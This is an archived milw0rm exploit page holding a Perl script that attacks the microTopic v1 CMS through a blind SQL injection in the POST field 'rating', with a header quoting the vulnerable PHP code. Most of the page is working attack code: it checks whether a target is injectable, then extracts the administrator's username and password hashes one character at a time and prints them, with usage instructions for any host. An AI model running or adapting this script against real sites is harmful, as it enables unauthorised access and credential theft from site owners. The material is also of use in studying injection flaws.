<html><head><title>microTopic v1 (rating) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []   []      **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	   	     (POST var 'rating') BLIND SQL INJECTION		              |
#|--------------------------------------------------------------------------------------------|
#|                         	  | microTopic v1 Initial Release |		 	      |
#|  CMS INFORMATION:		   -------------------------------			      |
#|										              |
#|--&gt;WEB: http://sourceforge.net/projects/microtopic/		   		              |
#|--&gt;DOWNLOAD: http://sourceforge.net/projects/microtopic/ 	   		              |
#|--&gt;DEMO: N/A										      |
#|--&gt;CATEGORY: CMS / Portal								      |
#|--&gt;DESCRIPTION: Simple News / Opinion site with page ranking Lightweight at ~ 200kb  	      |
#| 		Secure - Hashed challenge/response login Flexible...			      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3.0.10								      |
#|--&gt;DORK: &quot;N/A&quot;									      |
#|--&gt;CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
#|--&gt;AFFECT VERSION: v-1								      |
#|--&gt;Discovered Bug date: 2009-05-08							      |
#|--&gt;Reported Bug date: 2009-05-08							      |
#|--&gt;Fixed bug date: 2009-05-10								      |
#|--&gt;Info patch (v1.01): http://sourceforge.net/projects/microtopic/			      |   
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#----------------------------------------------------------------------------------------------
#
#------------
#VULN FILES:
#------------
#
#Path --&gt; [HOME_PATH]/admin/utopic.php
#
#It contents:
#
#	 $query=&quot;SELECT UNIX_TIMESTAMP(max(datum)) FROM {$my_table}_ip WHERE id='$_POST[rating]'
#           AND ip='$_SERVER[REMOTE_ADDR]'&quot;;
#   $sql=SendSQL($query);
#
#Path --&gt; [HOME_PATH]/admin/mysql.php
#
#It contents:
#
#function SendSQL($query){
#   $sql=mysql_query($query) or die(&quot;CANNOT &quot;.$query);
#   return $sql;
# }
#
#------------
#CONDITIONS:
#------------
#
#
#**magic quotes=off
#
#
#######################################################################
#######################################################################
##*******************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##   GREETZ TO: JosS, Ulises2k and all SPANISH Hack3Rs community!    ##
##*******************************************************************##
#######################################################################
#######################################################################
#
#-------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title microTopic v1 Initial Release (POST var 'rating') BLIND SQL Injection Exploit&quot;);
		system (&quot;color 02&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(POST =&gt; $_[0]);
	$request-&gt;content_type('application/x-www-form-urlencoded');
	$request-&gt;content($_[1]); 
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub helper {
	print &quot;\n\t[XxX] microTopic v1 Initial Release (POST var 'rating') BLIND SQL Injection Exploit\n&quot;;
	print &quot;\t[XxX] USAGE MODE: [XxX]\n&quot;;
	print &quot;\t[XxX] perl $0 [HOST] [PATH] [topic]\n&quot;;
	print &quot;\t[XxX] [HOST]: Web.\n&quot;;
	print &quot;\t[XxX] [PATH]: Home Path. Not path: no-path\n&quot;;
	print &quot;\t[XxX] [topic]: Valid topic. Opt: 1,2,3,4\n&quot;;
	print &quot;\t[XxX] Example: perl $0 'www.example.es' 'microtopic' '1'\n&quot;; 
}
sub error {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB IS NOT VULNERABLE!\n&quot;;
	print &quot;\tMaybe --&gt; \n&quot;;
	print &quot;\t1.-Patched\n&quot;;
	print &quot;\t2.-topic doesn't exist\n&quot;;
	print &quot;\t3.-Magic quotes ON\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}
sub testedblindsql {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB IS VULNERABLE!\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tStarting exploit...Waiting...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n&quot;;
}
sub exploit {
my $result=&quot;&quot;;
$k=1;
	$z=48;
	while(($k&lt;=32) &amp;&amp; ($z&lt;=126)){
		$blindsqlpost=&quot;rate=1&amp;rating=&quot;.$_[1].&quot;'+AND+ascii(substring((SELECT+&quot;.$_[2].&quot;+FROM+utopic_login+WHERE+loginid=1),&quot;.$k.&quot;,1))='&quot;.$z.&quot;&amp;postedcounter=1&amp;action=doit&quot;;
		$output=&amp;request($_[0],$blindsqlpost);
		if ( $output =~ (/\&lt;\/head\&gt;\&lt;body\&gt;/))
		{
			$result=$result.chr($z);
			$k++;
			$z=47;
		}
	if($z==57)
	{
		$z=96;
	}
#new char
	$z++; 
	}
return $result;
}
#Main
&amp;lw;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t##   microTopic v1 Initial Release - BSQLi Exploit     ##\n\n&quot;;
	print &quot;\t\t##                  Author: Y3nh4ck3r                  ##\n\n&quot;;
	print &quot;\t\t##             Condition: magic quotes=off             ##\n\n&quot;;
	print &quot;\t\t##         Contact:y3nh4ck3r[at]gmail[dot]com          ##\n\n&quot;;
	print &quot;\t\t##                  Proud to be Spanish!               ##\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
	print &quot;\t\t#########################################################\n\n&quot;;
#Init variables
	my $host=$ARGV[0];
	my $path=$ARGV[1];	
	my $topic=$ARGV[2];
#Build the uri
	if($path eq &quot;no-path&quot;){
		$finalhost=&quot;http://&quot;.$host.&quot;/index.php?topic=&quot;.$topic;
	}else{
		$finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/index.php?topic=&quot;.$topic;
	}
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=2) 
	{
		&amp;helper;
		exit(1);	
	}
$finalrequest = $finalhost;	
#Testing blind sql injection
$blindsqlpost=&quot;rate=1&amp;rating=&quot;.$topic.&quot;'+AND+1='0&amp;postedcounter=1&amp;action=doit&quot;; #blind sql injection
$output=&amp;request($finalrequest,$blindsqlpost);
if ( $output !~ (/\&lt;\/head\&gt;\&lt;body\&gt;/))
{    
	#blind sql injection is available
	&amp;testedblindsql;
}else{ 
	#Not injectable
	&amp;error;
	exit(1); 
}	
#Bruteforcing user...
$usernamehash=&amp;exploit($finalrequest,$topic,'username');
#Bruteforcing pass...
$passhash=&amp;exploit($finalrequest,$topic,'password');
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t****     EXPLOIT EXECUTED WITH SUCCESS       ****\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tUsername(md5 hash):&quot;.$usernamehash.&quot;\n&quot;;
print &quot;\t\tPassword(md5 hash):&quot;.$passhash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-05-11]</pre></html>